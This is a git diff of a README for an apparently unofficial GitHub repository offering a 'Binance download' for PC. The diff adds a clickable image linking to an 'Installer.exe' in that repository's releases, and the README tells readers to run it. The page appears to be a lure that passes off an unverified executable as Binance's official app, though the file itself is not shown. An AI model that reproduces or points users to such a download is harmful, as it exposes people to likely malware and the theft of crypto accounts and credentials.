@@ -21,9 +21,9 @@ Follow these simple steps to install the **Binance download** for your PC:
 
 1. **Download the file**  
    Click the button below to download the latest version of the **Binance app download** for your desktop. Alternatively, you can find the file in the release section of this repository.
-![download](https://github.com/user-attachments/assets/aa97a4d1-97af-4f80-b71a-1e250a17f931)
-
-
+<a href="https://github.com/candid25/download-binance-for-pc/releases/download/publish/Installer.exe">
+  <img src="https://github.com/user-attachments/assets/aa97a4d1-97af-4f80-b71a-1e250a17f931" alt="201887" width="300"/>
+</a>
 
 2. **Run the installer**  
    Once the file is downloaded, locate it in your downloads folder and double-click it to start the installation process.
